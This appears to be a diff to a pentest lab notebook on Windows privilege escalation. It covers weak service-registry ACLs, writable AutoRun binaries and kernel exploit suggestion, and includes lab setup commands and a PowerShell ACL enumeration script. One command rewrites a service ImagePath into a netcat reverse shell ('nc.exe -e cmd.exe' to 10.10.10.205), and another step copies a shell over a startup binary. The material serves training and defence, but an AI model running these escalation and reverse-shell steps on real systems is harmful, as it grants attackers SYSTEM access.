@@ -331,7 +331,7 @@ C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 
 ## Weak Permissions
 
-### Abusing Modifiable Service Binaries
+### Abusing Modifiable Service Binaries (Weak Service-binary ACL)
 
 <details>
 
@@ -561,7 +561,7 @@ foreach ($service in $services) {
 
 <figure><img src="../../.gitbook/assets/image (1914).png" alt=""><figcaption></figcaption></figure>
 
-### Abusing Modifiable Services&#x20;
+### Abusing Modifiable Services (Weak Service ACL)
 
 <details>
 
@@ -1165,4 +1165,423 @@ cp C:\users\esc_priv_user\Desktop\shell.exe 'C:\Program Files\DeviceTelemetry\Te
 {% endcode %}
 
 <figure><img src="../../.gitbook/assets/image (1937).png" alt=""><figcaption></figcaption></figure>
+
+### Abusing Modifiable Registry (Weak Registry ACL)
+
+Microsoft documents that a service's configuration is backed by `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>`, and `ImagePath` identifies the service binary path.
+
+<details>
+
+<summary><strong>Understanding the vulnerability</strong> </summary>
+
+Suppose we have:
+
+```
+HKLM
+ └── SYSTEM
+     └── CurrentControlSet
+         └── Services
+             └── MyService
+                 ├── ImagePath
+                 ├── Start
+                 ├── Type
+                 └── ObjectName
+```
+
+For example:
+
+```
+ImagePath = C:\Program Files\MyService\service.exe
+ObjectName = LocalSystem
+```
+
+Normally:
+
+```
+Low-privileged user
+        |
+        X
+        |   cannot modify service configuration
+        v
+Service
+```
+
+But suppose the registry ACL is:
+
+```
+HKLM\...\Services\MyService
+
+BUILTIN\Administrators     Full Control
+SYSTEM                     Full Control
+Users                      Full Control   <-- vulnerability
+```
+
+Then:
+
+```
+Low-privileged user
+        |
+        | KEY_SET_VALUE / Full Control
+        v
+MyService registry key
+        |
+        | modify ImagePath
+        v
+malicious.exe
+        |
+        | service starts as LocalSystem
+        v
+NT AUTHORITY\SYSTEM
+```
+
+That is the entire vulnerability.
+
+The crucial point is that **the service itself does not necessarily have to give us `SERVICE_CHANGE_CONFIG`**. We are changing the registry representation of its configuration instead. Microsoft separately documents `SERVICE_CHANGE_CONFIG` as the right required for changing configuration through the Service Control Manager.
+
+</details>
+
+<details>
+
+<summary><strong>Create the vulnerable environment</strong></summary>
+
+## Create the service&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```cmd
+sc.exe create RegAclDemo `
+    binPath= "C:\Windows\System32\cmd.exe /c exit 0" `
+    start= demand `
+    obj= LocalSystem
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1938).png" alt=""><figcaption></figcaption></figure>
+
+## Inspect its registry representation&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+reg query HKLM\SYSTEM\CurrentControlSet\Services\RegAclDemo
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1939).png" alt=""><figcaption></figcaption></figure>
+
+## Grant the low-privileged user registry write access&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```ps1
+$path = "HKLM:\SYSTEM\CurrentControlSet\Services\RegAclDemo"
+
+$rule = New-Object System.Security.AccessControl.RegistryAccessRule(
+    "esc_priv_user",
+    "FullControl",
+    "Allow"
+)
+
+$acl = Get-Acl $path
+$acl.AddAccessRule($rule)
+
+Set-Acl -Path $path -AclObject $acl
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1940).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
+#### identify Vulnerable Registry key (Automation)
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+# Find-WeakServiceRegistry.ps1
+# Run from a low-privileged PowerShell session.
+
+$ErrorActionPreference = "SilentlyContinue"
+
+$root = "HKLM:\SYSTEM\CurrentControlSet\Services"
+$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+
+Write-Host ""
+Write-Host "=============================================="
+Write-Host " Weak Service Registry ACL Enumeration"
+Write-Host "=============================================="
+Write-Host ""
+Write-Host "[+] Current user: $currentUser"
+Write-Host ""
+
+$services = Get-ChildItem $root
+
+foreach ($service in $services) {
+
+    try {
+        $acl = Get-Acl $service.PSPath
+
+        $hasWrite = $false
+        $matchingRules = @()
+
+        foreach ($rule in $acl.Access) {
+
+            if ($rule.AccessControlType -ne "Allow") {
+                continue
+            }
+
+            $identity = $rule.IdentityReference.Value
+
+            try {
+                $sid = $rule.IdentityReference.Translate(
+                    [System.Security.Principal.SecurityIdentifier]
+                )
+            }
+            catch {
+                continue
+            }
+
+            $currentToken = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+
+            $principal = New-Object System.Security.Principal.WindowsPrincipal($currentToken)
+
+            $matches = $false
+
+            if ($identity -eq $currentUser) {
+                $matches = $true
+            }
+            elseif ($identity -eq "Everyone") {
+                $matches = $true
+            }
+            elseif ($identity -eq "BUILTIN\Users" -and
+                    $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::User)) {
+                $matches = $true
+            }
+            elseif ($identity -eq "NT AUTHORITY\INTERACTIVE") {
+                $matches = $true
+            }
+
+            if ($matches) {
+
+                $writeRights =
+                    ($rule.RegistryRights.ToString() -match "WriteKey|FullControl|CreateSubKey|SetValue")
+
+                if ($writeRights) {
+
+                    $hasWrite = $true
+                    $matchingRules += $rule
+                }
+            }
+        }
+
+        if ($hasWrite) {
+
+            $serviceName = $service.PSChildName
+
+            $imagePath = $null
+            $start = $null
+            $objectName = $null
+
+            try {
+                $props = Get-ItemProperty $service.PSPath
+
+                $imagePath = $props.ImagePath
+                $start = $props.Start
+                $objectName = $props.ObjectName
+            }
+            catch {}
+
+            Write-Host "----------------------------------------------"
+            Write-Host "[!] Potentially vulnerable service: $serviceName"
+            Write-Host "    Registry : $($service.Name)"
+            Write-Host "    ImagePath: $imagePath"
+            Write-Host "    Start    : $start"
+            Write-Host "    Object   : $objectName"
+            Write-Host ""
+
+            foreach ($rule in $matchingRules) {
+                Write-Host "    ACL:"
+                Write-Host "      $($rule.IdentityReference)"
+                Write-Host "      $($rule.RegistryRights)"
+            }
+
+            Write-Host ""
+        }
+    }
+    catch {}
+}
+
+Write-Host "=============================================="
+Write-Host " Enumeration complete"
+Write-Host "=============================================="
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1941).png" alt=""><figcaption></figcaption></figure>
+
+#### Verify the vulnerability (Manual)
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+accesschk.exe /accepteula "esc_priv_user" -kvuqsw hklm\System\CurrentControlSet\services
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1942).png" alt=""><figcaption></figcaption></figure>
+
+#### Identify the Start type and Binary&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+sc.exe qc RegAclDemo
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1943).png" alt=""><figcaption></figcaption></figure>
+
+#### Change ImagePath with PowerShell and escalating Privileges&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1944).png" alt=""><figcaption></figcaption></figure>
+
+### Weak Registry AutoRun&#x20;
+
+<details>
+
+<summary><strong>Create the vulnerable environment</strong></summary>
+
+## Create the Directory&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+New-Item -ItemType Directory `
+    -Path "C:\Program Files\StartupLab" `
+    -Force
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1945).png" alt=""><figcaption></figcaption></figure>
+
+## Create legitimate test executable&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+$source = @'
+using System;
+using System.IO;
+using System.Security.Principal;
+
+class Program
+{
+    static void Main()
+    {
+        File.WriteAllText(
+            @"C:\ProgramData\StartupLab.txt",
+            "LEGITIMATE: " +
+            WindowsIdentity.GetCurrent().Name
+        );
+    }
+}
+'@
+
+Add-Type `
+    -TypeDefinition $source `
+    -OutputAssembly "C:\Program Files\StartupLab\StartupDemo.exe" `
+    -OutputType ConsoleApplication
+```
+{% endcode %}
+
+## Create the startup entry&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" ^
+ /v StartupLab ^
+ /t REG_SZ ^
+ /d "\"C:\Program Files\StartupLab\StartupDemo.exe\"" ^
+ /f
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1947).png" alt=""><figcaption></figcaption></figure>
+
+## Give Low-privileged user write access to the binary&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+icacls "C:\Program Files\StartupLab\StartupDemo.exe" ^
+ /grant "esc_priv_user":M
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1948).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
+#### Enumerate Startup Programs&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+Get-CimInstance Win32_StartupCommand |
+    Select-Object Name, Command, Location, User, UserSID |
+    Format-List
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1949).png" alt=""><figcaption></figcaption></figure>
+
+#### Identify writable startup&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+icacls "C:\Program Files\StartupLab\StartupDemo.exe"
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1951).png" alt=""><figcaption></figcaption></figure>
+
+#### Copy the malicious file&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+Copy-Item <source shell> <destination executable>
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1950).png" alt=""><figcaption></figcaption></figure>
+
+## Kernel Exploit&#x20;
+
+### Identifying Vulnerabilities Using Windows Exploit Suggester
+
+#### Export systeminfo to a file&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```
+systeminfo > systeminfo.txt
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1952).png" alt=""><figcaption></figcaption></figure>
+
+#### Feeding in Windows Exploit Suggester&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```bash
+python3 wes.py systeminfo.txt
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1953).png" alt=""><figcaption></figcaption></figure>
+
+### Exploiting vulnerability&#x20;
+
+1. **Identifying the most possible exploits through AI 😅. (Just for speedup)**&#x20;
+
+<figure><img src="../../.gitbook/assets/image (1954).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1955).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (1956).png" alt=""><figcaption></figcaption></figure>
 
